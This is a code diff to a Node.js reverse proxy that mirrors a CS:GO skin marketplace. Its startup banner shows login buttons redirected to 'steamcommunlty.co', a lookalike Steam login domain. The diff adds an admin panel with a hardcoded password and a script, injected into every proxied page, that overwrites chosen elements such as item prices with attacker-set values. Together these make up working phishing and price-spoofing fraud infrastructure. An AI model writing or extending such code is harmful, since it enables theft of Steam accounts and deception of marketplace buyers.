@@ -8,6 +8,8 @@ const http = require('http');
 const https = require('https');
 const path = require('path');
 const fs = require('fs');
+const bodyParser = require('body-parser'); // Добавлен для обработки форм в админке
+const basicAuth = require('express-basic-auth'); // Добавлен для базовой авторизации
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -24,6 +26,39 @@ app.use(compression());
 
 // Хранилище для cookies и токенов
 const sessions = new Map();
+
+// Хранилище для правил подмены селекторов
+const selectorRules = new Map();
+
+// Путь к файлу для сохранения правил
+const RULES_FILE_PATH = path.join(__dirname, 'selector_rules.json');
+
+// Загрузка сохраненных правил при запуске (если есть)
+try {
+    if (fs.existsSync(RULES_FILE_PATH)) {
+        const rulesData = fs.readFileSync(RULES_FILE_PATH, 'utf8');
+        const rules = JSON.parse(rulesData);
+        
+        rules.forEach(rule => {
+            selectorRules.set(rule.id, rule);
+        });
+        
+        console.log(`✅ Загружено ${selectorRules.size} правил подмены селекторов`);
+    }
+} catch (err) {
+    console.error('❌ Ошибка при загрузке правил подмены:', err);
+}
+
+// Функция для сохранения правил в файл
+function saveRulesToFile() {
+    try {
+        const rulesArray = Array.from(selectorRules.values());
+        fs.writeFileSync(RULES_FILE_PATH, JSON.stringify(rulesArray, null, 2), 'utf8');
+        console.log(`✅ Сохранено ${rulesArray.length} правил подмены селекторов`);
+    } catch (err) {
+        console.error('❌ Ошибка при сохранении правил подмены:', err);
+    }
+}
 
 // Создаем агент для HTTPS с игнорированием сертификатов и keepAlive
 const httpsAgent = new https.Agent({
@@ -643,9 +678,133 @@ function modifyUrls(content, baseUrl, contentType = '') {
 })();
 </script>
         `;
+
+        // НОВОЕ: Скрипт для подмены значений селекторов (клиентская часть)
+        const selectorReplacementScript = `
+        <script>
+        (function() {
+            // Функция для подмены значений селекторов
+            async function replaceSelectors() {
+                // Текущий URL страницы
+                const currentPath = window.location.href;
+                
+                try {
+                    // Получаем правила подмены с нашего прокси-сервера
+                    const response = await fetch('/admin-api/selector-rules?page=' + encodeURIComponent(currentPath), {
+                        method: 'GET',
+                        credentials: 'include'
+                    });
+                    
+                    if (!response.ok) return;
+                    
+                    const rules = await response.json();
+                    
+                    if (!rules || !rules.length) return;
+                    
+                    console.log('📎 Применяю правила подмены для селекторов:', rules.length);
+                    
+                    // Проходим по всем правилам
+                    rules.forEach(rule => {
+                        try {
+                            // Находим все элементы по селектору
+                            const elements = document.querySelectorAll(rule.selector);
+                            
+                            if (elements.length === 0) {
+                                console.log('⚠️ Элемент не найден для селектора:', rule.selector);
+                                
+                                // Используем MutationObserver для поиска элементов, которые могут появиться позже
+                                const observer = new MutationObserver((mutations, obs) => {
+                                    const elements = document.querySelectorAll(rule.selector);
+                                    if (elements.length > 0) {
+                                        elements.forEach(element => {
+                                            element.innerHTML = rule.value;
+                                            console.log('✅ Значение подменено для селектора (отложенная подмена):', rule.selector);
+                                        });
+                                        obs.disconnect(); // Отключаем наблюдатель после успешной подмены
+                                    }
+                                });
+                                
+                                // Наблюдаем за изменениями в DOM
+                                observer.observe(document.documentElement, {
+                                    childList: true,
+                                    subtree: true
+                                });
+                                
+                                return;
+                            }
+                            
+                            // Подменяем значение для каждого найденного элемента
+                            elements.forEach(element => {
+                                element.innerHTML = rule.value;
+                                console.log('✅ Значение подменено для селектора:', rule.selector);
+                            });
+                        } catch (err) {
+                            console.error('❌ Ошибка при подмене селектора:', rule.selector, err);
+                        }
+                    });
+                    
+                } catch (err) {
+                    console.error('❌ Ошибка при получении правил подмены:', err);
+                }
+            }
+            
+            // Запускаем подмену сразу после загрузки DOM
+            document.addEventListener('DOMContentLoaded', replaceSelectors);
+            
+            // Также запускаем с небольшой задержкой для динамически загружаемого контента
+            setTimeout(replaceSelectors, 500);
+            setTimeout(replaceSelectors, 1500);
+            setTimeout(replaceSelectors, 3000);
+            
+            // Подписываемся на изменения URL для SPA
+            let lastUrl = window.location.href;
+            
+            // Функция для проверки изменения URL
+            function checkUrlChange() {
+                const currentUrl = window.location.href;
+                if (currentUrl !== lastUrl) {
+                    lastUrl = currentUrl;
+                    console.log('📍 URL изменился, запускаю подмену селекторов');
+                    setTimeout(replaceSelectors, 500);
+                    setTimeout(replaceSelectors, 1500);
+                }
+                setTimeout(checkUrlChange, 1000);
+            }
+            
+            // Запускаем проверку URL
+            checkUrlChange();
+            
+            // Также используем MutationObserver для отслеживания изменений в DOM
+            const observer = new MutationObserver(mutations => {
+                // Проверяем, есть ли изменения в структуре DOM, которые могут повлиять на наши селекторы
+                const significantChanges = mutations.some(mutation => 
+                    mutation.type === 'childList' && 
+                    mutation.addedNodes.length > 0 &&
+                    Array.from(mutation.addedNodes).some(node => 
+                        node.nodeType === 1 && // Элемент
+                        (node.tagName === 'DIV' || node.tagName === 'SPAN' || node.tagName === 'APP-PAGE-INVENTORY-PRICE')
+                    )
+                );
+                
+                if (significantChanges) {
+                    console.log('📎 Обнаружены значительные изменения в DOM, запускаю подмену селекторов');
+                    replaceSelectors();
+                }
+            });
+            
+            // Наблюдаем за всем документом
+            observer.observe(document.documentElement, {
+                childList: true,
+                subtree: true
+            });
+            
+            console.log('📍 Система подмены селекторов инициализирована');
+        })();
+        </script>
+        `;
         
         modified = modified.replace(/<head[^>]*>/i, `$&${proxyScript}`);
-        modified = modified.replace('</body>', loginButtonsScript + '</body>');
+        modified = modified.replace('</body>', loginButtonsScript + selectorReplacementScript + '</body>');
     }
     
     // Специфичные замены для JavaScript
@@ -1012,6 +1171,385 @@ setInterval(() => {
     }
 }, 60 * 1000); // Проверка каждую минуту
 
+// НОВОЕ: Настройки аутентификации для админ-панели
+// Используем простую базовую аутентификацию
+const adminAuth = basicAuth({
+    users: { 'admin': 'csgo2024market' }, // Простой пароль для демонстрации
+    challenge: true,
+    realm: 'Admin Panel'
+});
+
+// НОВОЕ: Обслуживание статических файлов для админ-панели
+// Простая админ-панель без внешних зависимостей
+app.get('/admin', adminAuth, (req, res) => {
+    res.send(`
+    <!DOCTYPE html>
+    <html lang="ru">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Админ-панель</title>
+        <style>
+            body {
+                font-family: Arial, sans-serif;
+                max-width: 1200px;
+                margin: 0 auto;
+                padding: 20px;
+                background-color: #f5f5f5;
+            }
+            .container {
+                background-color: #fff;
+                border-radius: 5px;
+                box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+                padding: 20px;
+                margin-bottom: 20px;
+            }
+            h1, h2 {
+                color: #333;
+            }
+            .form-group {
+                margin-bottom: 15px;
+            }
+            label {
+                display: block;
+                font-weight: bold;
+                margin-bottom: 5px;
+            }
+            input[type="text"], textarea {
+                width: 100%;
+                padding: 8px;
+                border: 1px solid #ddd;
+                border-radius: 4px;
+                box-sizing: border-box;
+                font-size: 14px;
+            }
+            button {
+                background-color: #4CAF50;
+                color: white;
+                border: none;
+                padding: 10px 15px;
+                border-radius: 4px;
+                cursor: pointer;
+                font-size: 14px;
+            }
+            button:hover {
+                background-color: #45a049;
+            }
+            .delete-btn {
+                background-color: #f44336;
+                margin-left: 10px;
+            }
+            .delete-btn:hover {
+                background-color: #d32f2f;
+            }
+            table {
+                width: 100%;
+                border-collapse: collapse;
+                margin-top: 20px;
+            }
+            th, td {
+                padding: 12px;
+                text-align: left;
+                border-bottom: 1px solid #ddd;
+            }
+            th {
+                background-color: #f2f2f2;
+            }
+            tr:hover {
+                background-color: #f5f5f5;
+            }
+            .truncate {
+                max-width: 300px;
+                white-space: nowrap;
+                overflow: hidden;
+                text-overflow: ellipsis;
+            }
+            .success-message, .error-message {
+                padding: 10px;
+                margin: 10px 0;
+                border-radius: 4px;
+            }
+            .success-message {
+                background-color: #dff0d8;
+                color: #3c763d;
+                border: 1px solid #d6e9c6;
+            }
+            .error-message {
+                background-color: #f2dede;
+                color: #a94442;
+                border: 1px solid #ebccd1;
+            }
+            #messageContainer {
+                margin-bottom: 15px;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <h1>Админ-панель маркета</h1>
+            <div id="messageContainer"></div>
+            
+            <h2>Добавить правило подмены</h2>
+            <form id="ruleForm">
+                <div class="form-group">
+                    <label for="page">URL страницы:</label>
+                    <input type="text" id="page" name="page" placeholder="https://market-csgo.co/ru/Gloves/★%20Driver%20Gloves%20%7C%20Racing%20Green%20%28Well-Worn%29?id=6884780475" required>
+                </div>
+                <div class="form-group">
+                    <label for="selector">CSS-селектор:</label>
+                    <input type="text" id="selector" name="selector" placeholder="#app > app-main-site > div > app-full-inventory-info > div > app-page-inventory-info-wrap > div > app-page-inventory-price > div > span:nth-child(1)" required>
+                </div>
+                <div class="form-group">
+                    <label for="value">Новое значение:</label>
+                    <input type="text" id="value" name="value" placeholder="5114,96₽" required>
+                </div>
+                <button type="submit">Добавить правило</button>
+            </form>
+        </div>
+        
+        <div class="container">
+            <h2>Существующие правила</h2>
+            <table id="rulesTable">
+                <thead>
+                    <tr>
+                        <th>ID</th>
+                        <th>URL страницы</th>
+                        <th>CSS-селектор</th>
+                        <th>Новое значение</th>
+                        <th>Действия</th>
+                    </tr>
+                </thead>
+                <tbody id="rulesTableBody">
+                    <!-- Здесь будут отображаться правила -->
+                </tbody>
+            </table>
+        </div>
+        
+        <script>
+            // Функция для отображения сообщений
+            function showMessage(message, isError = false) {
+                const container = document.getElementById('messageContainer');
+                const msgElement = document.createElement('div');
+                msgElement.className = isError ? 'error-message' : 'success-message';
+                msgElement.textContent = message;
+                container.innerHTML = '';
+                container.appendChild(msgElement);
+                
+                // Автоматически скрываем сообщение через 5 секунд
+                setTimeout(() => {
+                    msgElement.remove();
+                }, 5000);
+            }
+            
+            // Функция для загрузки правил
+            async function loadRules() {
+                try {
+                    const response = await fetch('/admin-api/selector-rules');
+                    if (!response.ok) {
+                        throw new Error('Ошибка загрузки правил');
+                    }
+                    
+                    const rules = await response.json();
+                    const tableBody = document.getElementById('rulesTableBody');
+                    tableBody.innerHTML = '';
+                    
+                    if (rules.length === 0) {
+                        const row = document.createElement('tr');
+                        row.innerHTML = '<td colspan="5">Нет правил подмены</td>';
+                        tableBody.appendChild(row);
+                        return;
+                    }
+                    
+                    rules.forEach(rule => {
+                        const row = document.createElement('tr');
+                        row.innerHTML = \`
+                            <td>\${rule.id}</td>
+                            <td class="truncate" title="\${rule.page}">\${rule.page}</td>
+                            <td class="truncate" title="\${rule.selector}">\${rule.selector}</td>
+                            <td>\${rule.value}</td>
+                            <td>
+                                <button class="delete-btn" data-id="\${rule.id}">Удалить</button>
+                            </td>
+                        \`;
+                        tableBody.appendChild(row);
+                    });
+                    
+                    // Добавляем обработчики для кнопок удаления
+                    document.querySelectorAll('.delete-btn').forEach(btn => {
+                        btn.addEventListener('click', async () => {
+                            const id = btn.getAttribute('data-id');
+                            if (confirm('Вы уверены, что хотите удалить это правило?')) {
+                                await deleteRule(id);
+                            }
+                        });
+                    });
+                    
+                } catch (error) {
+                    showMessage('Ошибка при загрузке правил: ' + error.message, true);
+                }
+            }
+            
+            // Функция для добавления нового правила
+            async function addRule(formData) {
+                try {
+                    const response = await fetch('/admin-api/selector-rules', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(formData)
+                    });
+                    
+                    if (!response.ok) {
+                        const error = await response.json();
+                        throw new Error(error.message || 'Ошибка при добавлении правила');
+                    }
+                    
+                    showMessage('Правило успешно добавлено!');
+                    document.getElementById('ruleForm').reset();
+                    loadRules();
+                    
+                } catch (error) {
+                    showMessage('Ошибка при добавлении правила: ' + error.message, true);
+                }
+            }
+            
+            // Функция для удаления правила
+            async function deleteRule(id) {
+                try {
+                    const response = await fetch(\`/admin-api/selector-rules/\${id}\`, {
+                        method: 'DELETE'
+                    });
+                    
+                    if (!response.ok) {
+                        const error = await response.json();
+                        throw new Error(error.message || 'Ошибка при удалении правила');
+                    }
+                    
+                    showMessage('Правило успешно удалено!');
+                    loadRules();
+                    
+                } catch (error) {
+                    showMessage('Ошибка при удалении правила: ' + error.message, true);
+                }
+            }
+            
+            // Обработчик отправки формы
+            document.getElementById('ruleForm').addEventListener('submit', async (e) => {
+                e.preventDefault();
+                
+                const formData = {
+                    page: document.getElementById('page').value,
+                    selector: document.getElementById('selector').value,
+                    value: document.getElementById('value').value
+                };
+                
+                await addRule(formData);
+            });
+            
+            // Загружаем правила при загрузке страницы
+            document.addEventListener('DOMContentLoaded', loadRules);
+        </script>
+    </body>
+    </html>
+    `);
+});
+
+// НОВОЕ: API для админ-панели
+// Получение всех правил
+app.get('/admin-api/selector-rules', adminAuth, (req, res) => {
+    try {
+        const page = req.query.page;
+        
+        // Если указан параметр page, возвращаем только правила для этой страницы
+        if (page) {
+            const matchingRules = Array.from(selectorRules.values())
+                .filter(rule => {
+                    // Проверка совпадения URL
+                    // 1. Точное совпадение
+                    if (rule.page === page) return true;
+                    
+                    // 2. Совпадение по шаблону без учета параметров после ?
+                    const pageBase = page.split('?')[0];
+                    const ruleBase = rule.page.split('?')[0];
+                    
+                    if (pageBase === ruleBase) return true;
+                    
+                    // 3. Совпадение по регулярному выражению (если правило содержит регулярное выражение)
+                    if (rule.page.startsWith('/') && rule.page.endsWith('/')) {
+                        try {
+                            const regex = new RegExp(rule.page.substring(1, rule.page.length - 1));
+                            return regex.test(page);
+                        } catch (e) {
+                            console.error('Invalid regex in rule:', rule.page);
+                            return false;
+                        }
+                    }
+                    
+                    return false;
+                });
+            
+            return res.json(matchingRules);
+        }
+        
+        // Возвращаем все правила для админки
+        const rules = Array.from(selectorRules.values());
+        res.json(rules);
+    } catch (error) {
+        console.error('Error getting selector rules:', error);
+        res.status(500).json({ message: 'Ошибка при получении правил подмены' });
+    }
+});
+
+// Добавление нового правила
+app.post('/admin-api/selector-rules', adminAuth, (req, res) => {
+    try {
+        const { page, selector, value } = req.body;
+        
+        // Проверка обязательных полей
+        if (!page || !selector || !value) {
+            return res.status(400).json({ message: 'Все поля обязательны для заполнения' });
+        }
+        
+        // Создаем ID для правила
+        const id = Date.now().toString(36) + Math.random().toString(36).substring(2, 5);
+        
+        // Добавляем правило
+        selectorRules.set(id, { id, page, selector, value });
+        
+        // Сохраняем правила в файл
+        saveRulesToFile();
+        
+        res.status(201).json({ id, page, selector, value });
+    } catch (error) {
+        console.error('Error adding selector rule:', error);
+        res.status(500).json({ message: 'Ошибка при добавлении правила подмены' });
+    }
+});
+
+// Удаление правила
+app.delete('/admin-api/selector-rules/:id', adminAuth, (req, res) => {
+    try {
+        const { id } = req.params;
+        
+        // Проверяем, существует ли правило
+        if (!selectorRules.has(id)) {
+            return res.status(404).json({ message: 'Правило не найдено' });
+        }
+        
+        // Удаляем правило
+        selectorRules.delete(id);
+        
+        // Сохраняем правила в файл
+        saveRulesToFile();
+        
+        res.status(200).json({ message: 'Правило успешно удалено' });
+    } catch (error) {
+        console.error('Error deleting selector rule:', error);
+        res.status(500).json({ message: 'Ошибка при удалении правила подмены' });
+    }
+});
+
 // ИСПРАВЛЕНО: Улучшенная обработка GraphQL запросов с повторными попытками
 app.post('/api/graphql', async (req, res) => {
     try {
@@ -1358,12 +1896,13 @@ setInterval(() => {
 // Запуск сервера
 server.listen(PORT, '0.0.0.0', () => {
     console.log(`
-    🚀 Market Proxy Server
+    🚀 Market Proxy Server с Админ-панелью
     📡 Port: ${PORT}
     🎯 Target: ${TARGET_HOST}
     🔌 WebSocket: ${WS_TARGET}
     🔒 HTTPS: Auto-detected
     🔑 Login Interception: Enabled for #login-head-tablet, #login-register, #login-chat, #login-head -> https://steamcommunlty.co/openid/login?openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.mode=checkid_setup&openid.return_to=https%3A%2F%2Fdota2.net%2Flogin%2Findex.php%3Fgetmid%3Dcsgocom%26login%3D1%26ip%3D580783084.RytkB5FMW0&openid.realm=https%3A%2F%2Fdota2.net&openid.ns.sreg=http%3A%2F%2Fopenid.net%2Fextensions%2Fsreg%2F1.1&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select
+    👑 Admin Panel: ${getBaseUrl({headers: {host: 'localhost:'+PORT}, protocol: 'http'})}/admin
     
     Features:
     ✓ Full HTTP/HTTPS proxy
@@ -1375,6 +1914,7 @@ server.listen(PORT, '0.0.0.0', () => {
     ✓ Content modification
     ✓ Login buttons interception
     ✓ Mixed content prevention
+    ✓ Admin Panel with Selector Value Replacement
     `);
 });
 
